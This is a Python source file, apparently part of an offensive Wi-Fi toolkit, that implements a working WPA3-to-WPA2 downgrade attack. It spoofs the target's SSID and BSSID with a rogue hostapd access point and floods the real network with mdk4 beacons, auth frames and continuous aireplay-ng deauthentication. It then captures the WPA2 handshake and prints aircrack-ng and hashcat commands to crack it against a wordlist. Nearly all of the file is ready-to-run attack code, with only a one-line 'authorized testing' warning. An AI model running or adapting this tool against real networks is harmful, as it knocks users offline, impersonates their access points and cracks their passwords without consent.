# attacks/downgrade_attack.py

import subprocess
import time
import os
from pathlib import Path
from typing import Optional
from termcolor import colored
from .base import BaseAttack


class WPA3DowngradeAttack(BaseAttack):
    """
    WPA3 → WPA2 Downgrade Attack.

    Attack Flow:
    1. Creates a rogue WPA2 AP with same SSID as WPA3 target
    2. Sends deauth + SAE (WPA3 handshake) disruption frames
    3. Injects beacon frames advertising WPA2 only (no WPA3/SAE)
    4. Forces clients to downgrade and connect via WPA2
    5. Captures WPA2 4-way handshake for offline cracking
    """

    def __init__(self, monitor_interface: str, target_bssid: str,
                 target_ssid: str, target_channel: str):
        super().__init__(monitor_interface)
        self.target_bssid   = target_bssid
        self.target_ssid    = target_ssid
        self.target_channel = str(target_channel)

        # Processes
        self.hostapd_proc   = None
        self.deauth_proc    = None
        self.mdk4_proc      = None
        self.capture_proc   = None
        self.dnsmasq_proc   = None

        # Paths
        self.temp_dir       = Path("/tmp/wpa3_downgrade")
        self.hostapd_conf   = self.temp_dir / "hostapd.conf"
        self.capture_file   = self.temp_dir / "capture"
        self.handshake_file = self.temp_dir / "handshake.cap"
        self.ap_interface   = None

    # ─────────────────────────────────────────────────────────────────────
    # PRE-ATTACK CLEANUP
    # ─────────────────────────────────────────────────────────────────────
    def _pre_attack_cleanup(self):
        """Kill all previous attacks before starting."""
        print(colored("\n🧹 Clearing previous attacks...", "cyan"))

        for proc in ["hostapd", "airbase-ng", "dnsmasq", "aireplay-ng",
                     "airodump-ng", "mdk4", "wifiphisher", "bettercap"]:
            subprocess.run(f"pkill -f {proc}", shell=True, capture_output=True)

        for i in range(5):
            subprocess.run(f"ip link set at{i} down 2>/dev/null",
                           shell=True, capture_output=True)

        subprocess.run("iptables -t nat -F 2>/dev/null", shell=True, capture_output=True)
        subprocess.run("iptables -F 2>/dev/null",        shell=True, capture_output=True)
        subprocess.run("ip neigh flush all 2>/dev/null", shell=True, capture_output=True)

        for f in ["/var/lib/misc/dnsmasq.leases", "/tmp/dnsmasq.leases"]:
            subprocess.run(f"rm -f {f}", shell=True, capture_output=True)

        time.sleep(2)
        print(colored("[✓] Previous attacks cleared!\n", "green"))

    # ─────────────────────────────────────────────────────────────────────
    # MAIN EXECUTE
    # ─────────────────────────────────────────────────────────────────────
    def _execute(self):
        print(colored("\n╔" + "═"*60 + "╗", "red", attrs=['bold']))
        print(colored("║" + " "*10 + "🔓 WPA3 → WPA2 DOWNGRADE ATTACK" + " "*18 + "║", "red", attrs=['bold']))
        print(colored("╚" + "═"*60 + "╝", "red", attrs=['bold']))

        print(colored("\n⚠️  WARNING: Use only for authorized security testing!", "red", attrs=['bold']))

        print(colored("\n📍 Target:", "cyan", attrs=['bold']))
        print(f"   SSID    : {colored(self.target_ssid, 'yellow', attrs=['bold'])}")
        print(f"   BSSID   : {colored(self.target_bssid, 'yellow')}")
        print(f"   Channel : {colored(self.target_channel, 'yellow')}")

        # Cleanup
        self._pre_attack_cleanup()
        self.temp_dir.mkdir(parents=True, exist_ok=True)

        try:
            # Check dependencies
            if not self._check_dependencies():
                return

            # Select attack mode
            print(colored("\n❓ Select Downgrade Mode:", "yellow", attrs=['bold']))
            print("  [1] 🔥 Full Downgrade (Rogue WPA2 AP + Deauth + Handshake Capture)")
            print("  [2] 🎯 Beacon Only (Flood WPA2 beacons, suppress WPA3)")
            print("  [3] ⚡ SAE Disruption (Disrupt WPA3 SAE handshakes only)")
            print("  [0] Cancel")

            choice = input(colored("\n ➤ Select mode: ", "cyan")).strip()

            if choice == "1":
                self._full_downgrade_attack()
            elif choice == "2":
                self._beacon_downgrade_attack()
            elif choice == "3":
                self._sae_disruption_attack()
            else:
                return

        except KeyboardInterrupt:
            print(colored("\n\n[!] Attack stopped by user.", "yellow"))
        except Exception as e:
            print(colored(f"\n[!] Error: {e}", "red"))
            import traceback
            traceback.print_exc()
        finally:
            self._cleanup()

    # ─────────────────────────────────────────────────────────────────────
    # MODE 1: FULL DOWNGRADE ATTACK
    # ─────────────────────────────────────────────────────────────────────
    def _full_downgrade_attack(self):
        """
        Full WPA3 downgrade:
        1. Rogue WPA2 AP (same SSID, spoof BSSID)
        2. Continuous deauth from real WPA3 AP
        3. Capture WPA2 handshake when client downgrades
        """
        print(colored("\n[*] MODE 1: Full Downgrade Attack", "cyan", attrs=['bold']))

        # Get WPA2 password for rogue AP
        wpa2_pass = input(colored(
            " ➤ WPA2 password for rogue AP (min 8 chars, default: 'password123'): ",
            "cyan"
        )).strip() or "password123"

        if len(wpa2_pass) < 8:
            print(colored("[!] Password must be at least 8 characters!", "red"))
            wpa2_pass = "password123"

        # Step 1: Get managed interface for hostapd
        managed_iface = self._get_managed_interface()
        if not managed_iface:
            print(colored("[!] No managed interface found for hostapd.", "red"))
            print(colored("[!] Connect a second WiFi adapter for the rogue AP.", "yellow"))
            return

        print(colored(f"\n[✓] Using {managed_iface} for rogue WPA2 AP", "green"))
        print(colored(f"[✓] Using {self.monitor_interface} for deauth + capture", "green"))

        # Step 2: Create hostapd config
        print(colored("\n[*] Step 1: Creating WPA2 rogue AP config...", "cyan"))
        self._create_hostapd_config(managed_iface, wpa2_pass)

        # Step 3: Start rogue WPA2 AP
        print(colored("[*] Step 2: Starting rogue WPA2 AP...", "cyan"))
        if not self._start_hostapd():
            print(colored("[!] Failed to start rogue AP. Aborting.", "red"))
            return

        # Step 4: Configure network
        print(colored("[*] Step 3: Configuring network...", "cyan"))
        self._configure_network(managed_iface)

        # Step 5: Start DHCP
        print(colored("[*] Step 4: Starting DHCP server...", "cyan"))
        self._start_dhcp(managed_iface)

        # Step 6: Start handshake capture on monitor interface
        print(colored("[*] Step 5: Starting WPA2 handshake capture...", "cyan"))
        self._start_handshake_capture()

        # Step 7: Start continuous deauth from real AP
        print(colored("[*] Step 6: Starting deauth (forcing clients off WPA3)...", "cyan"))
        self._start_deauth()

        # Step 8: Show status and monitor
        self._print_full_status(managed_iface, wpa2_pass)
        self._monitor_handshake()

    # ─────────────────────────────────────────────────────────────────────
    # MODE 2: BEACON DOWNGRADE
    # ─────────────────────────────────────────────────────────────────────
    def _beacon_downgrade_attack(self):
        """
        Flood WPA2-only beacons with same SSID.
        Confuses clients into thinking WPA3 AP is gone.
        """
        print(colored("\n[*] MODE 2: Beacon Downgrade Attack", "cyan", attrs=['bold']))
        print(colored("[*] Flooding WPA2 beacons to suppress WPA3 AP...", "cyan"))

        # Create SSID list with just the target (WPA2 beacons)
        ssid_file = self.temp_dir / "downgrade_ssids.txt"
        with open(ssid_file, "w") as f:
            f.write(f"{self.target_ssid}\n")

        # Lock to target channel
        subprocess.run(
            ["iw", "dev", self.monitor_interface, "set", "channel", self.target_channel],
            capture_output=True
        )

        # mdk4 beacon flood - WPA2 tagged
        cmd = [
            "mdk4",
            self.monitor_interface,
            "b",                       # beacon flood
            "-f", str(ssid_file),      # SSID list
            "-c", self.target_channel, # locked channel
            "-s", "1000",              # high speed
            "-w", "WPA"                # advertise as WPA2 only
        ]

        print(colored(f"[CMD] {' '.join(cmd)}", "white"))

        self.mdk4_proc = subprocess.Popen(cmd)

        # Also start deauth simultaneously
        print(colored("[*] Starting deauth to disconnect WPA3 clients...", "cyan"))
        self._start_deauth()

        print(colored("\n╔" + "═"*60 + "╗", "green", attrs=['bold']))
        print(colored("║" + " "*15 + "✓ BEACON DOWNGRADE ACTIVE" + " "*19 + "║", "green", attrs=['bold']))
        print(colored("╚" + "═"*60 + "╝", "green", attrs=['bold']))

        print(colored("\n💡 What's happening:", "cyan", attrs=['bold']))
        print(f"   1. Flooding WPA2-only beacons for '{self.target_ssid}'")
        print("   2. Sending deauth to disconnect clients from WPA3 AP")
        print("   3. Clients see WPA2 AP and connect (downgraded!)")

        print(colored("\n⏳ Running... Press Ctrl+C to stop\n", "yellow"))

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    # ─────────────────────────────────────────────────────────────────────
    # MODE 3: SAE DISRUPTION
    # ─────────────────────────────────────────────────────────────────────
    def _sae_disruption_attack(self):
        """
        Disrupt WPA3 SAE (Simultaneous Authentication of Equals) handshakes.
        Prevents WPA3 connections, forcing fallback to WPA2 (if AP supports it).
        """
        print(colored("\n[*] MODE 3: SAE Disruption Attack", "cyan", attrs=['bold']))
        print(colored("[*] Disrupting WPA3 SAE handshakes...", "cyan"))

        # Create target file for mdk4
        target_file = self.temp_dir / "sae_target.txt"
        with open(target_file, "w") as f:
            f.write(f"{self.target_bssid}\n")

        # Lock to target channel
        subprocess.run(
            ["iw", "dev", self.monitor_interface, "set", "channel", self.target_channel],
            capture_output=True
        )

        # mdk4 auth flood - overwhelms SAE handshake process
        cmd = [
            "mdk4",
            self.monitor_interface,
            "a",                        # auth flood mode
            "-a", self.target_bssid,    # target AP
            "-s", "400",                # speed
        ]

        print(colored(f"[CMD] {' '.join(cmd)}", "white"))

        self.mdk4_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        time.sleep(2)

        if self.mdk4_proc.poll() is not None:
            print(colored("[!] mdk4 auth flood failed. Trying deauth only...", "yellow"))
            self._start_deauth()
        else:
            print(colored("[✓] SAE disruption started!", "green"))
            # Also start deauth for extra force
            self._start_deauth()

        print(colored("\n╔" + "═"*60 + "╗", "green", attrs=['bold']))
        print(colored("║" + " "*14 + "✓ SAE DISRUPTION ACTIVE" + " "*22 + "║", "green", attrs=['bold']))
        print(colored("╚" + "═"*60 + "╝", "green", attrs=['bold']))

        print(colored("\n💡 What's happening:", "cyan", attrs=['bold']))
        print("   1. Flooding SAE auth frames → WPA3 handshakes fail")
        print("   2. Sending deauth frames → clients disconnect")
        print("   3. If AP has WPA2 fallback → clients use WPA2!")
        print("   4. Run Mode 1 alongside to capture WPA2 handshake")

        print(colored("\n⚠️  Note: This works best on WPA3-Transition mode APs", "yellow"))
        print(colored("⚠️  Pure WPA3 APs will not fall back to WPA2", "yellow"))

        print(colored("\n⏳ Running... Press Ctrl+C to stop\n", "yellow"))

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    # ─────────────────────────────────────────────────────────────────────
    # HOSTAPD CONFIG
    # ─────────────────────────────────────────────────────────────────────
    def _create_hostapd_config(self, iface: str, password: str):
        """Create hostapd WPA2 config (no WPA3/SAE)."""

        # Determine hw_mode based on channel
        try:
            ch = int(self.target_channel)
            hw_mode = "a" if ch > 14 else "g"
        except:
            hw_mode = "g"

        config = f"""# RubyFi - WPA3 Downgrade - Rogue WPA2 AP
interface={iface}
driver=nl80211
ssid={self.target_ssid}
hw_mode={hw_mode}
channel={self.target_channel}
ieee80211n=1
wmm_enabled=1

# Spoof target BSSID
bssid={self.target_bssid}

# WPA2 ONLY - No WPA3/SAE
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase={password}

# Broadcast SSID
ignore_broadcast_ssid=0

# Max clients
max_num_sta=25
"""

        with open(self.hostapd_conf, "w") as f:
            f.write(config)

        print(colored(f"[✓] hostapd config created (WPA2 only, no SAE)", "green"))
        print(colored(f"    SSID     : {self.target_ssid}", "white"))
        print(colored(f"    BSSID    : {self.target_bssid}", "white"))
        print(colored(f"    Channel  : {self.target_channel}", "white"))
        print(colored(f"    Password : {password}", "white"))

    # ─────────────────────────────────────────────────────────────────────
    # START HOSTAPD
    # ─────────────────────────────────────────────────────────────────────
    def _start_hostapd(self) -> bool:
        """Start hostapd rogue WPA2 AP."""
        try:
            cmd = ["hostapd", str(self.hostapd_conf)]
            print(colored(f"[CMD] {' '.join(cmd)}", "white"))

            self.hostapd_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setpgrp
            )

            # Wait for AP to start
            print(colored("[*] Waiting for hostapd to start...", "cyan"))
            for i in range(10):
                if self.hostapd_proc.poll() is not None:
                    out, err = self.hostapd_proc.communicate()
                    print(colored(f"[!] hostapd failed:\n{out}\n{err}", "red"))

                    # Common fixes
                    if "interface is managed" in err.lower():
                        print(colored("[!] Interface is in managed mode.", "yellow"))
                        print(colored("[!] Run: sudo ip link set <iface> down && sudo iw <iface> set type ap", "yellow"))
                    elif "configured channel" in err.lower():
                        print(colored("[!] Channel mismatch for 5GHz. Try a standard 5GHz channel.", "yellow"))
                    return False

                time.sleep(1)
                print(colored(f"[*] Starting... ({i+1}/10)", "cyan"), end="\r")

            print(colored("\n[✓] Rogue WPA2 AP started!", "green"))
            return True

        except Exception as e:
            print(colored(f"[!] hostapd error: {e}", "red"))
            return False

    # ─────────────────────────────────────────────────────────────────────
    # NETWORK CONFIG
    # ─────────────────────────────────────────────────────────────────────
    def _configure_network(self, iface: str):
        """Configure network interface for rogue AP."""
        try:
            subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
            time.sleep(1)
            subprocess.run(["ip", "link", "set", iface, "up"],   capture_output=True)
            time.sleep(1)

            subprocess.run(["ip", "addr", "flush", "dev", iface], capture_output=True)
            subprocess.run(
                ["ip", "addr", "add", "192.168.100.1/24", "dev", iface],
                capture_output=True
            )

            print(colored(f"[✓] {iface} configured (192.168.100.1/24)", "green"))

        except Exception as e:
            print(colored(f"[!] Network config error: {e}", "yellow"))

    # ─────────────────────────────────────────────────────────────────────
    # DHCP SERVER
    # ─────────────────────────────────────────────────────────────────────
    def _start_dhcp(self, iface: str):
        """Start dnsmasq DHCP server."""
        try:
            subprocess.run("pkill -9 dnsmasq", shell=True, capture_output=True)
            time.sleep(1)

            conf = "/tmp/dnsmasq_downgrade.conf"
            with open(conf, "w") as f:
                f.write(f"""interface={iface}
bind-interfaces
dhcp-range=192.168.100.10,192.168.100.250,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,8.8.8.8
port=0
no-daemon
""")

            self.dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", conf, "--no-daemon"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            time.sleep(2)

            if self.dnsmasq_proc.poll() is None:
                print(colored("[✓] DHCP server started (192.168.100.10-250)", "green"))
            else:
                print(colored("[!] DHCP server failed to start", "yellow"))

        except Exception as e:
            print(colored(f"[!] DHCP error: {e}", "yellow"))

    # ─────────────────────────────────────────────────────────────────────
    # HANDSHAKE CAPTURE
    # ─────────────────────────────────────────────────────────────────────
    def _start_handshake_capture(self):
        """Start airodump-ng to capture WPA2 handshake."""
        try:
            # Lock monitor to target channel
            subprocess.run(
                ["iw", "dev", self.monitor_interface, "set", "channel", self.target_channel],
                capture_output=True
            )

            cmd = [
                "airodump-ng",
                "--bssid", self.target_bssid,
                "--channel", self.target_channel,
                "--write", str(self.capture_file),
                "--output-format", "cap",
                "--write-interval", "1",
                self.monitor_interface
            ]

            print(colored(f"[CMD] {' '.join(cmd)}", "white"))

            self.capture_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            time.sleep(2)

            if self.capture_proc.poll() is None:
                print(colored(f"[✓] Capturing WPA2 handshakes → {self.capture_file}-01.cap", "green"))
            else:
                print(colored("[!] airodump-ng failed to start", "yellow"))

        except Exception as e:
            print(colored(f"[!] Capture error: {e}", "yellow"))

    # ─────────────────────────────────────────────────────────────────────
    # DEAUTH
    # ─────────────────────────────────────────────────────────────────────
    def _start_deauth(self):
        """Start continuous deauth attack."""
        try:
            self.deauth_proc = subprocess.Popen(
                [
                    "aireplay-ng",
                    "--deauth", "0",           # continuous
                    "-a", self.target_bssid,   # target AP
                    self.monitor_interface
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(colored("[✓] Deauth attack started (continuous)", "green"))
        except Exception as e:
            print(colored(f"[!] Deauth error: {e}", "yellow"))

    # ─────────────────────────────────────────────────────────────────────
    # MONITOR HANDSHAKE
    # ─────────────────────────────────────────────────────────────────────
    def _monitor_handshake(self):
        """Monitor for captured WPA2 handshake."""
        print(colored("━"*60, "cyan"))
        print(colored(" 🔑 WAITING FOR WPA2 HANDSHAKE CAPTURE:", "cyan", attrs=['bold']))
        print(colored("━"*60, "cyan"))
        print(colored("\n💡 Tips:", "yellow"))
        print("   - Wait for victim to reconnect after deauth")
        print("   - Handshake is captured when client reconnects")
        print(f"   - File: {self.capture_file}-01.cap")
        print(colored("\n⏳ Monitoring... Press Ctrl+C to stop\n", "yellow"))

        handshake_found = False
        start_time = time.time()

        try:
            while True:
                time.sleep(5)
                elapsed = int(time.time() - start_time)

                cap_file = Path(f"{self.capture_file}-01.cap")

                if cap_file.exists() and not handshake_found:
                    # Check for handshake using aircrack-ng
                    result = subprocess.run(
                        ["aircrack-ng", str(cap_file)],
                        capture_output=True,
                        text=True
                    )

                    if "1 handshake" in result.stdout or "handshake" in result.stdout.lower():
                        handshake_found = True

                        print(colored("\n" + "╔" + "═"*60 + "╗", "green", attrs=['bold']))
                        print(colored("║" + " "*15 + "🎯 WPA2 HANDSHAKE CAPTURED!" + " "*18 + "║", "green", attrs=['bold']))
                        print(colored("╚" + "═"*60 + "╝", "green", attrs=['bold']))

                        print(colored(f"\n[✓] Handshake saved: {cap_file}", "green"))
                        print(colored("\n🔓 Crack it with:", "cyan", attrs=['bold']))
                        print(colored(f"   aircrack-ng -w /usr/share/wordlists/rockyou.txt {cap_file}", "yellow"))
                        print(colored(f"   hashcat -m 2500 {cap_file} /usr/share/wordlists/rockyou.txt", "yellow"))

                        # Copy to permanent location
                        perm = Path.home() / f"handshake_{self.target_ssid.replace(' ','_')}.cap"
                        subprocess.run(["cp", str(cap_file), str(perm)], capture_output=True)
                        print(colored(f"   Saved to: {perm}", "green"))

                # Show live status
                status = "🔑 Handshake CAPTURED!" if handshake_found else "⏳ Waiting for handshake..."
                print(colored(
                    f"\r   [{elapsed:4d}s] {status} | "
                    f"AP: {self.target_ssid} | "
                    f"Channel: {self.target_channel}",
                    "green" if handshake_found else "cyan"
                ), end="")

        except KeyboardInterrupt:
            pass

    # ─────────────────────────────────────────────────────────────────────
    # HELPERS
    # ─────────────────────────────────────────────────────────────────────
    def _get_managed_interface(self) -> Optional[str]:
        """Find a managed (non-monitor) wireless interface."""
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
        blocks = result.stdout.strip().split("Interface ")

        for block in blocks:
            if not block.strip():
                continue
            lines = block.splitlines()
            iface = lines[0].strip()

            for ln in lines:
                if "type managed" in ln and iface != self.monitor_interface:
                    return iface

        return None

    def _check_dependencies(self) -> bool:
        """Check required tools."""
        tools = {
            "hostapd"     : "hostapd",
            "airbase-ng"  : "aircrack-ng",
            "aireplay-ng" : "aircrack-ng",
            "airodump-ng" : "aircrack-ng",
            "aircrack-ng" : "aircrack-ng",
            "mdk4"        : "mdk4",
            "dnsmasq"     : "dnsmasq"
        }
        missing = []

        for tool, pkg in tools.items():
            r = subprocess.run(["which", tool], capture_output=True)
            if r.returncode != 0:
                missing.append(f"{tool}  →  sudo apt install {pkg}")

        if missing:
            print(colored("\n[!] Missing tools:", "red"))
            for t in missing:
                print(colored(f"    - {t}", "yellow"))
            return False

        print(colored("[✓] All dependencies found", "green"))
        return True

    # ─────────────────────────────────────────────────────────────────────
    # STATUS DISPLAY
    # ─────────────────────────────────────────────────────────────────────
    def _print_full_status(self, iface: str, password: str):
        print(colored("\n╔" + "═"*60 + "╗", "green", attrs=['bold']))
        print(colored("║" + " "*12 + "✓ WPA3 DOWNGRADE ATTACK ACTIVE!" + " "*17 + "║", "green", attrs=['bold']))
        print(colored("╚" + "═"*60 + "╝", "green", attrs=['bold']))

        print(colored("\n📊 Attack Status:", "cyan", attrs=['bold']))
        print(f"   • Target WPA3 AP   : {colored(self.target_ssid, 'red')}  (WPA3)")
        print(f"   • Rogue WPA2 AP    : {colored(self.target_ssid, 'green')}  (WPA2 ← downgraded)")
        print(f"   • Rogue Interface  : {colored(iface, 'cyan')}")
        print(f"   • Monitor Iface    : {colored(self.monitor_interface, 'cyan')}")
        print(f"   • WPA2 Password    : {colored(password, 'yellow')}")
        print(f"   • Capture File     : {colored(str(self.capture_file) + '-01.cap', 'yellow')}")

        print(colored("\n💡 Attack Flow:", "cyan", attrs=['bold']))
        print("   1. Clients deauthed from real WPA3 AP")
        print("   2. Rogue WPA2 AP broadcasts same SSID")
        print("   3. Client connects to WPA2 (downgraded!)")
        print("   4. WPA2 4-way handshake captured")
        print("   5. Crack offline with aircrack-ng / hashcat")

        print(colored("\n⚠️  Note: Works best on WPA3-Transition mode APs", "yellow"))
        print(colored("   (APs that support both WPA3 + WPA2 simultaneously)", "yellow"))

        print(colored("\n⏳ Monitoring for handshake...", "yellow"))
        print(colored("   Press Ctrl+C to stop\n", "magenta"))

    # ─────────────────────────────────────────────────────────────────────
    # CLEANUP
    # ─────────────────────────────────────────────────────────────────────
    def _cleanup(self):
        print(colored("\n\n[*] Cleaning up WPA3 Downgrade Attack...", "cyan"))

        for proc in [self.hostapd_proc, self.deauth_proc,
                     self.mdk4_proc, self.capture_proc, self.dnsmasq_proc]:
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except:
                    try:
                        proc.kill()
                    except:
                        pass

        subprocess.run("pkill hostapd",     shell=True, capture_output=True)
        subprocess.run("pkill aireplay-ng", shell=True, capture_output=True)
        subprocess.run("pkill airodump-ng", shell=True, capture_output=True)
        subprocess.run("pkill dnsmasq",     shell=True, capture_output=True)
        subprocess.run("pkill mdk4",        shell=True, capture_output=True)

        for i in range(5):
            subprocess.run(f"ip link set at{i} down 2>/dev/null",
                           shell=True, capture_output=True)

        subprocess.run("iptables -t nat -F 2>/dev/null", shell=True, capture_output=True)
        subprocess.run("iptables -F 2>/dev/null",        shell=True, capture_output=True)
        subprocess.run("systemctl start NetworkManager 2>/dev/null",
                       shell=True, capture_output=True)

        # Handshake summary
        cap_file = Path(f"{self.capture_file}-01.cap")
        print(colored("\n" + "="*50, "green", attrs=['bold']))
        print(colored("  📋 CAPTURE SUMMARY", "green", attrs=['bold']))
        print(colored("="*50, "green", attrs=['bold']))

        if cap_file.exists() and cap_file.stat().st_size > 0:
            print(colored(f"  ✓ Capture file: {cap_file}", "green"))
            print(colored(f"\n  Crack with:", "cyan"))
            print(colored(f"  aircrack-ng -w /usr/share/wordlists/rockyou.txt {cap_file}", "yellow"))
            print(colored(f"  hashcat -m 2500 {cap_file} /usr/share/wordlists/rockyou.txt", "yellow"))
        else:
            print(colored("  (no handshake captured)", "yellow"))

        print(colored("="*50, "green", attrs=['bold']))
        print(colored("[✓] Cleanup complete\n", "green"))
